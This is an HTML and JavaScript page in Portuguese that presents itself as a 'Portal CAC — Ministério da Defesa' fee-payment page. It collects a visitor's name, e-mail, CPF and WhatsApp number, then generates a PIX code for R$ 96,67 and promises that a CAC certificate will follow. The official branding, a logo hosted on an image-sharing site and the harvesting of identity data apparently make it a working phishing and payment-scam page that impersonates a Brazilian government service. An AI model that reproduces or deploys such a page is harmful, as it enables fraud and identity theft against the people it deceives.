<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento PIX - Registro CAC</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Roboto', sans-serif;
            background-color: #6B7A08;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px 16px;
        }

        .logo-area {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo-area img {
            height: 56px;
        }

        .card {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.18);
            width: 100%;
            max-width: 420px;
            padding: 32px 28px;
        }

        .card-title {
            text-align: center;
            font-size: 1.15rem;
            font-weight: 700;
            color: #3d4700;
            margin-bottom: 6px;
        }
        .card-subtitle {
            text-align: center;
            font-size: 0.85rem;
            color: #666;
            margin-bottom: 20px;
        }

        /* Valor destacado */
        .valor-box {
            background: #f5f7e8;
            border: 2px solid #8a9a0a;
            border-radius: 8px;
            text-align: center;
            padding: 14px 10px;
            margin-bottom: 22px;
        }
        .valor-label { font-size: 0.8rem; color: #6B7A08; font-weight: 500; }
        .valor-num {
            font-size: 2rem;
            font-weight: 700;
            color: #3d4700;
            letter-spacing: 1px;
        }

        /* Campos */
        .field { margin-bottom: 14px; }
        label { display: block; font-size: 0.82rem; font-weight: 600; color: #444; margin-bottom: 4px; }
        input[type="text"], input[type="email"], input[type="tel"] {
            width: 100%;
            padding: 10px 12px;
            border: 1.5px solid #ccc;
            border-radius: 6px;
            font-size: 0.95rem;
            color: #222;
            transition: border-color 0.2s;
            background: #fafafa;
        }
        input:focus { outline: none; border-color: #6B7A08; background: #fff; }

        /* Botão gerar PIX */
        #btnGerar {
            width: 100%;
            background: #6B7A08;
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 14px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: background 0.2s;
            margin-top: 6px;
        }
        #btnGerar:hover { background: #4e5a06; }
        #btnGerar:disabled { background: #aaa; cursor: not-allowed; }

        /* Spinner */
        .spinner {
            width: 20px; height: 20px;
            border: 3px solid rgba(255,255,255,0.4);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            display: none;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* Erro */
        .erro-box {
            display: none;
            background: #fff0f0;
            border: 1px solid #f44;
            border-radius: 6px;
            padding: 12px;
            color: #c00;
            font-size: 0.85rem;
            margin-top: 12px;
            text-align: center;
        }

        /* Seção PIX gerado */
        #secaoPix { display: none; }

        .pix-titulo {
            text-align: center;
            font-weight: 700;
            font-size: 1rem;
            color: #3d4700;
            margin: 20px 0 8px;
        }
        .pix-instrucao {
            text-align: center;
            font-size: 0.82rem;
            color: #666;
            margin-bottom: 14px;
        }

        /* QR Code */
        .qr-wrapper { display: none; }

        /* Copia e cola */
        .copiacola-label {
            font-size: 0.78rem;
            font-weight: 600;
            color: #555;
            margin-bottom: 4px;
        }
        .copiacola-box {
            display: flex;
            gap: 6px;
            align-items: stretch;
        }
        .copiacola-input {
            flex: 1;
            background: #f3f4f6;
            border: 1.5px solid #ccc;
            border-radius: 6px;
            padding: 8px 10px;
            font-size: 0.72rem;
            color: #333;
            word-break: break-all;
            resize: none;
            height: 90px;
            font-family: monospace;
        }
        .btn-copiar {
            background: #6B7A08;
            color: #fff;
            border: none;
            border-radius: 6px;
            padding: 0 14px;
            font-size: 0.85rem;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 3px;
            min-width: 58px;
            transition: background 0.2s;
        }
        .btn-copiar:hover { background: #4e5a06; }
        .btn-copiar i { font-size: 1.1rem; }
        .btn-copiar span { font-size: 0.65rem; }

        /* Status pagamento */
        .status-box {
            margin-top: 18px;
            padding: 14px;
            border-radius: 8px;
            text-align: center;
            font-weight: 600;
            font-size: 0.9rem;
        }
        .status-pending {
            background: #fffde7;
            border: 1.5px solid #f9a825;
            color: #795800;
        }
        .status-paid {
            background: #e8f5e9;
            border: 1.5px solid #2e7d32;
            color: #1b5e20;
            font-size: 1.05rem;
        }
        .status-paid i { font-size: 1.5rem; display: block; margin-bottom: 6px; }

        /* Divisor */
        .divider {
            border: none;
            border-top: 1px solid #e0e0e0;
            margin: 20px 0;
        }

        /* Footer */
        .rodape {
            margin-top: 18px;
            text-align: center;
            font-size: 0.75rem;
            color: rgba(255,255,255,0.7);
        }

        /* Expiração */
        .expiracao {
            text-align: center;
            font-size: 0.78rem;
            color: #888;
            margin-top: 8px;
        }
    </style>
</head>
<body>

    <div class="logo-area">
        <img src="https://i.ibb.co/SfLGWgz/PORTAL-CAC-1.png" alt="Portal CAC" onerror="this.style.display='none'">
    </div>

    <div class="card">
        <div class="card-title">💳 Pagamento das Taxas CAC</div>
        <div class="card-subtitle">Finalize seu cadastro pagando via PIX</div>

        <div class="valor-box">
            <div class="valor-label">VALOR TOTAL</div>
            <div class="valor-num">R$ 96,67</div>
        </div>

        <!-- Formulário de dados -->
        <div id="secaoForm">
            <div class="field">
                <label for="nome">Nome completo</label>
                <input type="text" id="nome" placeholder="Seu nome completo">
            </div>
            <div class="field">
                <label for="email">E-mail</label>
                <input type="email" id="email" placeholder="seuemail@exemplo.com">
            </div>
            <div class="field">
                <label for="cpf">CPF</label>
                <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14">
            </div>
            <div class="field">
                <label for="telefone">Telefone (WhatsApp)</label>
                <input type="tel" id="telefone" placeholder="(11) 91234-5678" maxlength="15">
            </div>

            <button id="btnGerar" onclick="gerarPix()">
                <i class="fas fa-qrcode"></i>
                <span id="btnTexto">Gerar PIX</span>
                <div class="spinner" id="spinner"></div>
            </button>

            <div class="erro-box" id="erroBox"></div>
        </div>

        <!-- Seção PIX gerado -->
        <div id="secaoPix">
            <hr class="divider">
            <div class="pix-titulo">✅ PIX gerado com sucesso!</div>
            <div class="pix-instrucao">Copie o código abaixo e cole no seu app do banco</div>

            <div class="copiacola-label">Pix Copia e Cola</div>
            <div class="copiacola-box">
                <textarea class="copiacola-input" id="pixCode" readonly></textarea>
                <button class="btn-copiar" onclick="copiarCodigo()">
                    <i class="fas fa-copy" id="icoCopiar"></i>
                    <span id="txtCopiar">Copiar</span>
                </button>
            </div>

            <div class="expiracao" id="expiracao"></div>

            <div class="status-box status-pending" id="statusBox">
                <i class="fas fa-clock"></i>
                Aguardando pagamento...
            </div>
        </div>
    </div>

    <div class="rodape">
        Portal CAC — Ministério da Defesa
    </div>

    <script>
        // ─── Pegar dados da URL ───────────────────────────────────────────
        const params = new URLSearchParams(window.location.search);
        const cpfStorage = sessionStorage.getItem('cpf') || '';

        function limparParam(v) {
            if (!v || v === 'null' || v === 'undefined' || v === 'Nome não disponível') return '';
            return decodeURIComponent(v).trim();
        }

        const nomeParam     = limparParam(params.get('name'));
        const emailParam    = limparParam(params.get('email'));
        const telefoneParam = limparParam(params.get('telephone'));
        const cpfParam      = limparParam(params.get('document')) || cpfStorage;

        // Preencher campos
        if (nomeParam)     document.getElementById('nome').value     = nomeParam;
        if (emailParam)    document.getElementById('email').value    = emailParam;
        if (telefoneParam) document.getElementById('telefone').value = formatarTelefone(telefoneParam);
        if (cpfParam)      document.getElementById('cpf').value      = formatarCPF(cpfParam);

        // ─── Formatação ───────────────────────────────────────────────────
        function formatarCPF(v) {
            v = v.replace(/\D/g, '').slice(0, 11);
            return v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
        }
        function formatarTelefone(v) {
            v = v.replace(/\D/g, '').slice(0, 11);
            if (v.length === 11) return v.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
            if (v.length === 10) return v.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
            return v;
        }

        document.getElementById('cpf').addEventListener('input', function() {
            this.value = formatarCPF(this.value);
        });
        document.getElementById('telefone').addEventListener('input', function() {
            this.value = formatarTelefone(this.value);
        });

        // ─── Gerar PIX ────────────────────────────────────────────────────
        let hashTransacao = null;
        let pollingInterval = null;

        async function gerarPix() {
            const nome     = document.getElementById('nome').value.trim();
            const email    = document.getElementById('email').value.trim();
            const cpf      = document.getElementById('cpf').value.replace(/\D/g, '');
            const telefone = document.getElementById('telefone').value.replace(/\D/g, '');
            const erroBox  = document.getElementById('erroBox');

            erroBox.style.display = 'none';

            if (!nome || !email || !cpf || !telefone) {
                mostrarErro('Preencha todos os campos antes de gerar o PIX.');
                return;
            }
            if (cpf.length !== 11) {
                mostrarErro('CPF inválido. Verifique e tente novamente.');
                return;
            }

            setCarregando(true);

            try {
                const resp = await fetch('/api/gerar-pix', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ name: nome, email, document: cpf, phone: telefone, amount: 9667 })
                });

                const json = await resp.json();

                if (!resp.ok || !json.success) {
                    const msg = json.error?.message || JSON.stringify(json.error) || 'Erro ao gerar PIX.';
                    mostrarErro('Não foi possível gerar o PIX: ' + msg);
                    return;
                }

                // Exibir PIX
                // Código EMV (copia e cola)
                const pixCode = json.pix_code || '';
                document.getElementById('pixCode').value = pixCode;
                hashTransacao = json.hash;

                if (json.expires_at) {
                    const exp = new Date(json.expires_at);
                    document.getElementById('expiracao').textContent =
                        'Válido até ' + exp.toLocaleString('pt-BR');
                }

                // QR Code: usa imagem da API se vier, senão gera via API pública
                const qrImg = document.getElementById('qrCodeImg');
                if (json.qr_code) {
                    qrImg.src = json.qr_code;
                } else if (pixCode) {
                    qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`;
                }

                document.getElementById('secaoForm').style.display = 'none';
                document.getElementById('secaoPix').style.display  = 'block';

                iniciarPolling();

            } catch (e) {
                mostrarErro('Erro de conexão. Verifique sua internet e tente novamente.');
                console.error(e);
            } finally {
                setCarregando(false);
            }
        }

        // ─── Polling status ───────────────────────────────────────────────
        function iniciarPolling() {
            if (!hashTransacao) return;
            pollingInterval = setInterval(async () => {
                try {
                    const r = await fetch('/api/status-pix?hash=' + hashTransacao);
                    const d = await r.json();
                    if (d.success && d.status === 'paid') {
                        clearInterval(pollingInterval);
                        mostrarPago();
                    }
                } catch (_) {}
            }, 5000);
        }

        function mostrarPago() {
            const box = document.getElementById('statusBox');
            box.className = 'status-box status-paid';
            box.innerHTML = '<i class="fas fa-check-circle"></i>Pagamento confirmado! ✅<br><small style="font-weight:400;font-size:0.82rem">Seu certificado CAC será emitido em breve.</small>';
        }

        // ─── Copiar código ────────────────────────────────────────────────
        function copiarCodigo() {
            const code = document.getElementById('pixCode').value;
            navigator.clipboard.writeText(code).then(() => {
                document.getElementById('icoCopiar').className = 'fas fa-check';
                document.getElementById('txtCopiar').textContent = 'Copiado!';
                setTimeout(() => {
                    document.getElementById('icoCopiar').className = 'fas fa-copy';
                    document.getElementById('txtCopiar').textContent = 'Copiar';
                }, 2500);
            });
        }

        // ─── Helpers ──────────────────────────────────────────────────────
        function setCarregando(v) {
            const btn = document.getElementById('btnGerar');
            btn.disabled = v;
            document.getElementById('btnTexto').textContent = v ? 'Gerando...' : 'Gerar PIX';
            document.getElementById('spinner').style.display = v ? 'block' : 'none';
        }
        function mostrarErro(msg) {
            const b = document.getElementById('erroBox');
            b.textContent = msg;
            b.style.display = 'block';
            setCarregando(false);
        }
    </script>
</body>
</html>
